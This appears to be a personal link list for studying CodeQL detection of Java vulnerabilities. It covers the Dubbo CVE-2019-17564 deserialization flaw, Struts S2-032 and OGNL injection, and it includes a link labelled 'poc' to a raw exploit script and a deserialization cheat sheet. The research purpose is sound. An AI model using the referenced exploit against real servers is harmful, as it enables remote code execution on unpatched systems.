https://github.com/githubsatelliteworkshops/codeql/blob/master/java.md

cve 2019 17564

https://y4er.com/post/apache-dubbo-cve-2019-17564/

https://qiita.com/shimizukawasaki/items/39c9695d439768cfaeb5



codeql cli

https://docs.github.com/en/code-security/code-scanning/using-codeql-code-scanning-with-your-existing-ci-system/installing-codeql-cli-in-your-ci-system

[java deserialize cheat sheet](https://paper.seebug.org/123/)

https://geekmasher.dev/posts/sast/codeql-introduction

# STRUTS

### ref:

https://archive.apache.org/dist/struts/

s2-032: 

https://blog.csdn.net/Fly_hps/article/details/85035961

https://blog.csdn.net/weixin_34277853/article/details/94714787

poc : https://raw.githubusercontent.com/wangeradd1/MyPyExploit/master/s2-032_all.py



codeql: https://github.com/Semmle/SecurityQueries/blob/master/semmle-security-java/queries/struts/cve_2018_11776/ognl_Injection_final.ql



https://0range228.github.io/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/

JAVA DESERIALIZE :

https://javamana.com/2021/09/20210911042728955p.html

https://www.bbsmax.com/A/LPdoXaOgz3/

https://www.bbsmax.com/A/amd06K3jJg/

https://www.bbsmax.com/A/gGdXBmkWJ4/



paper:

https://xz.aliyun.com/search?keyword=codeql



https://blog.gypsyengineer.com/en/security/detecting-dangerous-spring-exporters-with-codeql.html
